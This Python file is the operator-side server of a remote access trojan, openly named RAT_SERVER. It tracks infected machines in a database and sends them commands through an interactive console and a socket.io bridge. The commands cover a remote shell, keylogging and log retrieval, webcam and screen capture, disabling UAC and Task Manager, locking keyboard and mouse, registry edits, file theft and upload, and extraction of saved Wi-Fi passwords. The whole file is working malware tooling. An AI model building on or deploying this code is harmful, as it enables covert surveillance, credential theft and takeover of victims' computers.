import socket
import threading
import os
import socketio
import sys
import logging
import sqlite3
import json
import random

# Configure logging
logging.basicConfig(level=logging.DEBUG)

class RAT_SERVER:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.clients = {}
        self.current_client_ip = None
        self.current_client_socket = None
        self.sio = socketio.Client()

        self.db_init()

        @self.sio.event
        def connect():
            logging.debug('Connected to server')

        @self.sio.event
        def connect_error(data):
            logging.debug(f'Connection failed: {data}')

        @self.sio.event
        def disconnect():
            logging.debug('Disconnected from server')

        @self.sio.on('server-message')
        def on_server_message(message):
            logging.debug(f'Server message: {message}')

        @self.sio.on('client-update')
        def on_client_update(data):
            logging.debug(f'Client update: {data}')

        @self.sio.on('server-command')
        def on_server_command(data):
            command = data.get('command')
            if command:
                logging.debug(f'Received command from app.py: {command}')
                output = self.execute_command(command)
                formatted_output = f'[*] {output}'
                logging.debug(f'Command output: {formatted_output}')
                self.sio.emit('server-response', {'message': formatted_output})
            else:
                logging.debug('Received invalid command')
                self.sio.emit('server-response', {'message': 'Received invalid command'})

    def db_init(self):
        self.conn = sqlite3.connect('clients.db', check_same_thread=False)
        self.cursor = self.conn.cursor()
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS clients (
                               id INTEGER PRIMARY KEY,
                               ip TEXT,
                               profile TEXT)''')
        self.conn.commit()

    def db_add_client(self, ip, profile):
        self.cursor.execute("INSERT INTO clients (ip, profile) VALUES (?, ?)", (ip, profile))
        self.conn.commit()

    def db_get_clients(self):
        self.cursor.execute("SELECT * FROM clients")
        return self.cursor.fetchall()

    def db_delete_client(self, ip):
        self.cursor.execute("DELETE FROM clients WHERE ip = ?", (ip,))
        self.conn.commit()

    def connect_to_socket_server(self):
        try:
            self.sio.connect('http://localhost:5000', transports=['websocket'])
        except socketio.exceptions.ConnectionError as e:
            logging.debug(f"Connection error: {e}")

    def build_connection(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.host, self.port))
        s.listen(5)
        logging.debug("[*] Waiting for the client...")

        def handle_client(client_socket, client_address):
            try:
                profile = client_socket.recv(1024).decode()
                if profile:
                    logging.debug(f"Received profile from {client_address[0]}: {profile}")
                    self.clients[client_address[0]] = (client_socket, profile)
                    self.db_add_client(client_address[0], profile)
                    logging.debug(f"[*] Connection is established successfully with {client_address[0]}")
                    print(f"{client_address[0]} has connected")
                else:
                    logging.debug(f"No profile received from {client_address[0]}")
                
                while True:
                    try:
                        data = client_socket.recv(1024)
                        if not data:
                            break
                        # Process client data here
                    except socket.error:
                        break

            except Exception as e:
                logging.debug(f"Failed to handle client {client_address[0]}: {e}")

            finally:
                self.client_disconnected(client_address[0])

        while True:
            client_socket, client_address = s.accept()
            logging.debug(f"New connection from {client_address[0]}")
            print(f"{client_address[0]} has connected")
            client_handler = threading.Thread(
                target=handle_client, args=(client_socket, client_address)
            )
            client_handler.start()

    def client_disconnected(self, ip):
        if ip in self.clients:
            client_socket = self.clients[ip][0]
            client_socket.close()
            del self.clients[ip]
            self.db_delete_client(ip)
            logging.debug(f"Disconnected from {ip}")
        else:
            logging.debug(f"No client with IP {ip}")

    def server(self):
        try:
            from vidstream import StreamingServer
            self.streaming_server = StreamingServer(self.host, 8080)
            self.streaming_server.start_server()
        except ImportError:
            logging.debug("Module not found...")

    def stop_server(self):
        self.streaming_server.stop_server()

    def result(self, command):
        if self.current_client_socket:
            self.current_client_socket.send(command.encode())
            result_output = self.current_client_socket.recv(1024).decode()
            logging.debug(result_output)
            return result_output
        else:
            return "No client connected"

    def banner(self):
        print("======================================================")
        print("                       Commands                       ")
        print("======================================================")

    def disconnect(self, client_ip):
        if client_ip in self.clients:
            client_socket = self.clients[client_ip][0]
            client_socket.close()
            del self.clients[client_ip]
            self.db_delete_client(client_ip)
            logging.debug(f"Disconnected from {client_ip}")
        else:
            logging.debug(f"No client with IP {client_ip}")

    def execute_command(self, command):
        if command == 'example':
            return 'This is an example command output.'
        elif command == 'list_clients':
            formatted_clients = []
            clients = self.db_get_clients()
            for client in clients:
                ip, profile = client[1], client[2]
                try:
                    profile_data = json.loads(profile)
                    formatted_clients.append(f"{profile_data.get('name', 'Unknown')} - {profile_data.get('os', 'Unknown')} - {ip}")
                except json.JSONDecodeError:
                    formatted_clients.append(f"Unknown - {ip}")
            if not formatted_clients:
                return "No clients connected"
            return "\n".join(formatted_clients)
        elif command == 'list':
            return self.execute_command('list_clients')
        elif command.startswith('connect'):
            try:
                _, ip = command.split()
                if ip in self.clients:
                    self.current_client_ip = ip
                    self.current_client_socket = self.clients[ip][0]
                    return f"Connected to {ip}"
                else:
                    return f"No client with IP {ip}"
            except ValueError:
                return "Usage: connect <ip>"
        elif command == 'disconnect':
            if self.current_client_ip:
                self.disconnect(self.current_client_ip)
                self.current_client_ip = None
                self.current_client_socket = None
                return "Disconnected from client"
            else:
                return "No client connected"
        elif command == 'tasklist':
            return self.result(command)
        elif command == 'geolocate':
            return self.result(command)
        elif command == 'screenshare':
            if self.current_client_socket:
                self.current_client_socket.send(command.encode("utf-8"))
                self.server()
                return "Screenshare started"
            else:
                return "No client connected"
        elif command == 'shell':
            if self.current_client_socket:
                self.current_client_socket.send(command.encode())
                shell_output = []
                while True:
                    command = input('>> ').strip()
                    if command.lower() == 'back':
                        logging.debug("Returning to main command input...")
                        break
                    self.current_client_socket.send(command.encode())
                    if command.lower() == 'exit':
                        break
                    result_output = self.current_client_socket.recv(1024).decode()
                    logging.debug(result_output)
                    shell_output.append(result_output)
                return "\n".join(shell_output)
            else:
                return "No client connected"
        elif command == 'drivers':
            return self.result(command)
        elif command == 'setvalue':
            if self.current_client_socket:
                const = str(input("Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: "))
                root = str(input('Enter the path to store key [ex. SOFTWARE\\test]: '))
                key = str(input('Enter the key name: '))
                value = str(input('Enter the value of key [None, 0, 1, 2 etc.]: '))
                self.current_client_socket.send(command.encode())
                self.current_client_socket.send(const.encode())
                self.current_client_socket.send(root.encode())
                self.current_client_socket.send(key.encode())
                self.current_client_socket.send(value.encode())
                result_output = self.current_client_socket.recv(1024).decode()
                return result_output
            else:
                return "No client connected"
        elif command == 'delkey':
            if self.current_client_socket:
                const = str(input("Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: "))
                root = str(input('Enter the path to key: '))
                self.current_client_socket.send(command.encode())
                self.current_client_socket.send(const.encode())
                self.current_client_socket.send(root.encode())
                result_output = self.current_client_socket.recv(1024).decode()
                return result_output
            else:
                return "No client connected"
        elif command == 'createkey':
            if self.current_client_socket:
                const = str(input("Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: "))
                root = str(input('Enter the path to key: '))
                self.current_client_socket.send(command.encode())
                self.current_client_socket.send(const.encode())
                self.current_client_socket.send(root.encode())
                result_output = self.current_client_socket.recv(1024).decode()
                return result_output
            else:
                return "No client connected"
        elif command == 'disableUAC':
            return self.result(command)
        elif command == 'reboot':
            return self.result(command)
        elif command == 'usbdrivers':
            return self.result(command)
        elif command == 'volumeup':
            return self.result(command)
        elif command == 'volumedown':
            return self.result(command)
        elif command == 'monitors':
            return self.result(command)
        elif command.startswith('kill'):
            if not command[5:]:
                return "No process mentioned to terminate"
            else:
                return self.result(command)
        elif command == 'extendrights':
            return self.result(command)
        elif command == 'turnoffmon':
            return self.result(command)
        elif command == 'turnonmon':
            return self.result(command)
        elif command == 'setwallpaper':
            if self.current_client_socket:
                text = str(input("Enter the filename: "))
                self.current_client_socket.send(command.encode())
                self.current_client_socket.send(text.encode())
                result_output = self.current_client_socket.recv(1024).decode()
                return result_output
            else:
                return "No client connected"
        elif command == 'keyscan_start':
            return self.result(command)
        elif command == 'send_logs':
            return self.result(command)
        elif command == 'stop_keylogger':
            return self.result(command)
        elif command.startswith('delfile'):
            if not command[8:]:
                return "No file to delete"
            else:
                return self.result(command)
        elif command.startswith('createfile'):
            if not command[11:]:
                return "No file to create"
            else:
                return self.result(command)
        elif command == 'ipconfig':
            return self.result(command)
        elif command.startswith('writein'):
            if not command[8:]:
                return "No text to output"
            else:
                return self.result(command)
        elif command == 'sendmessage':
            if self.current_client_socket:
                text = str(input("Enter the text: "))
                title = str(input("Enter the title: "))
                self.current_client_socket.send(command.encode())
                self.current_client_socket.send(text.encode())
                self.current_client_socket.send(title.encode())
                result_output = self.current_client_socket.recv(1024).decode()
                return result_output
            else:
                return "No client connected"
        elif command == 'profilepswd':
            if self.current_client_socket:
                profile = str(input("Enter the profile name: "))
                self.current_client_socket.send(command.encode())
                self.current_client_socket.send(profile.encode())
                result_output = self.current_client_socket.recv(2147483647).decode()
                return result_output
            else:
                return "No client connected"
        elif command == 'profiles':
            return self.result(command)
        elif command == 'cpu_cores':
            return self.result(command)
        elif command.startswith('cd'):
            if not command[3:]:
                return "No directory"
            else:
                return self.result(command)
        elif command == 'cd ..':
            return self.result(command)
        elif command[1:2] == ':':
            return self.result(command)
        elif command == 'dir':
            return self.result(command)
        elif command == 'portscan':
            return self.result(command)
        elif command == 'systeminfo':
            return self.result(command)
        elif command == 'localtime':
            return self.result(command)
        elif command.startswith('abspath'):
            if not command[8:]:
                return "No file"
            else:
                return self.result(command)
        elif command.startswith('readfile'):
            if not command[9:]:
                return "No file to read"
            else:
                self.current_client_socket.send(command.encode())
                result_output = self.current_client_socket.recv(2147483647).decode()
                return f"===================================================\n{result_output}\n==================================================="
        elif command.startswith("disable") and command.endswith("--keyboard"):
            return self.result(command)
        elif command.startswith("disable") and command.endswith("--mouse"):
            return self.result(command)
        elif command.startswith("disable") and command.endswith("--all"):
            return self.result(command)
        elif command.startswith("enable") and command.endswith("--all"):
            return self.result(command)
        elif command.startswith("enable") and command.endswith("--keyboard"):
            return self.result(command)
        elif command.startswith("enable") and command.endswith("--mouse"):
            return self.result(command)
        elif command.startswith('browser'):
            if self.current_client_socket:
                query = str(input("Enter the query: "))
                self.current_client_socket.send(command.encode())
                self.current_client_socket.send(query.encode())
                result_output = self.current_client_socket.recv(1024).decode()
                return result_output
            else:
                return "No client connected"
        elif command.startswith('cp'):
            return self.result(command)
        elif command.startswith('mv'):
            return self.result(command)
        elif command.startswith('editfile'):
            return self.result(command)
        elif command.startswith('mkdir'):
            if not command[6:]:
                return "No directory name"
            else:
                return self.result(command)
        elif command.startswith('rmdir'):
            if not command[6:]:
                return "No directory name"
            else:
                return self.result(command)
        elif command.startswith('searchfile'):
            return self.result(command)
        elif command == 'curpid':
            return self.result(command)
        elif command == 'sysinfo':
            return self.result(command)
        elif command == 'pwd':
            return self.result(command)
        elif command == 'screenshare':
            if self.current_client_socket:
                self.current_client_socket.send(command.encode("utf-8"))
                self.server()
                return "Screenshare started"
            else:
                return "No client connected"
        elif command == 'webcam':
            if self.current_client_socket:
                self.current_client_socket.send(command.encode("utf-8"))
                self.server()
                return "Webcam streaming started"
            else:
                return "No client connected"
        elif command == 'breakstream':
            self.stop_server()
            return "Streaming stopped"
        elif command.startswith('startfile'):
            if not command[10:]:
                return "No file to launch"
            else:
                return self.result(command)
        elif command.startswith('download'):
            try:
                self.current_client_socket.send(command.encode())
                file = self.current_client_socket.recv(2147483647)
                with open(f'{command.split(" ")[2]}', 'wb') as f:
                    f.write(file)
                return "File is downloaded"
            except:
                return "Not enough arguments or download failed"
        elif command == 'upload':
            if self.current_client_socket:
                file = str(input("Enter the filepath to the file: "))
                filename = str(input("Enter the filepath to outgoing file (with filename and extension): "))
                with open(file, 'rb') as data:
                    filedata = data.read(2147483647)
                self.current_client_socket.send(command.encode())
                self.current_client_socket.send(filename.encode())
                self.current_client_socket.send(filedata)
                return "File has been sent"
            else:
                return "No client connected"
        elif command == 'disabletaskmgr':
            return self.result(command)
        elif command == 'enabletaskmgr':
            return self.result(command)
        elif command == 'isuseradmin':
            return self.result(command)
        elif command == 'help':
            self.banner()
        elif command == 'screenshot':
            if self.current_client_socket:
                self.current_client_socket.send(command.encode())
                file = self.current_client_socket.recv(2147483647)
                path = f'{os.getcwd()}\\{random.randint(11111,99999)}.png'
                with open(path, 'wb') as f:
                    f.write(file)
                path1 = os.path.abspath(path)
                return f"File is stored at {path1}"
            else:
                return "No client connected"
        elif command == 'webcam_snap':
            if self.current_client_socket:
                self.current_client_socket.send(command.encode())
                file = self.current_client_socket.recv(2147483647)
                path = f'{os.getcwd()}\\{random.randint(11111,99999)}.png'
                with open(path, 'wb') as f:
                    f.write(file)
                return "Webcam snapshot saved"
            else:
                return "No client connected"
        else:
            return f'Unknown command: {command}'

    def execute(self):
        self.banner()

        while True:
            command = input('Command >>  ').strip()
            logging.debug(f'Executing command: {command}')
            output = self.execute_command(command)
            logging.debug(f'Command output: {output}')
            print(output)

rat = RAT_SERVER('127.0.0.1', 4444)

if __name__ == '__main__':
    if len(sys.argv) > 1:
        command = sys.argv[1]
        output = rat.execute_command(command)
        logging.debug(output)
        print(output)
    else:
        connection_thread = threading.Thread(target=rat.build_connection)
        connection_thread.start()
        rat.connect_to_socket_server()
        rat.execute()
